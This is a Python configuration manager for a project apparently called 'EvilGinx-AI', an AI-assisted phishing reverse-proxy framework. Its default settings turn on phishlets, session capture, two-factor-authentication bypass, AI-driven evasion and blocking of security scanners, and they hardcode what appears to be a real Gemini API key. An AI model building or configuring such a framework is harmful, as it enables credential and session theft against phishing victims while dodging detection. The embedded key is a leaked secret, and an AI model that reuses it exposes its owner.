"""
Configuration Manager for EvilGinx-AI
Handles loading and managing configuration settings
"""

import yaml
import os
from pathlib import Path
import logging

logger = logging.getLogger(__name__)

class ConfigManager:
    """Manages configuration for the EvilGinx-AI framework"""
    
    def __init__(self, config_file='config/config.yaml'):
        self.config_file = Path(config_file)
        self.config = {}
        
    def load_config(self):
        """Load configuration from file or create default"""
        if self.config_file.exists():
            try:
                with open(self.config_file, 'r') as f:
                    self.config = yaml.safe_load(f) or {}
                logger.info(f"Configuration loaded from {self.config_file}")
            except Exception as e:
                logger.error(f"Error loading config: {e}")
                self.config = self._get_default_config()
        else:
            logger.info("Config file not found, creating default configuration")
            self.config = self._get_default_config()
            self.save_config()
            
        return self.config
    
    def save_config(self):
        """Save current configuration to file"""
        try:
            # Ensure config directory exists
            self.config_file.parent.mkdir(parents=True, exist_ok=True)
            
            with open(self.config_file, 'w') as f:
                yaml.dump(self.config, f, default_flow_style=False, indent=2)
            logger.info(f"Configuration saved to {self.config_file}")
        except Exception as e:
            logger.error(f"Error saving config: {e}")
    
    def _get_default_config(self):
        """Return default configuration"""
        return {
            # Server settings
            'proxy_port': 80,
            'proxy_ssl_port': 443,
            'dns_port': 53,
            'dashboard_port': 8080,
            
            # AI settings
            'gemini_api_key': 'AIzaSyAJFQ_m8mrEB8n_QfiO7nosPfz9wJAtk_0',
            'ai_enabled': True,
            'ai_detection_enabled': True,
            'ai_content_generation': True,
            'ai_evasion_enabled': True,
            
            # Phishing settings
            'phishlets_dir': 'phishlets',
            'certificates_dir': 'certificates',
            'database_file': 'database/sessions.db',
            
            # Security settings
            'block_scanners': True,
            'block_known_ips': True,
            'enable_logging': True,
            'log_level': 'INFO',
            
            # Domain settings
            'base_domain': 'example.com',
            'redirect_url': 'https://google.com',
            
            # SSL/TLS settings
            'auto_ssl': True,
            'ssl_cert_path': '',
            'ssl_key_path': '',
            
            # Advanced settings
            'max_sessions': 1000,
            'session_timeout': 3600,  # 1 hour
            'enable_2fa_bypass': True,
            'capture_screenshots': False,
        }
    
    def get(self, key, default=None):
        """Get configuration value"""
        return self.config.get(key, default)
    
    def set(self, key, value):
        """Set configuration value"""
        self.config[key] = value
    
    def update(self, updates):
        """Update multiple configuration values"""
        self.config.update(updates)

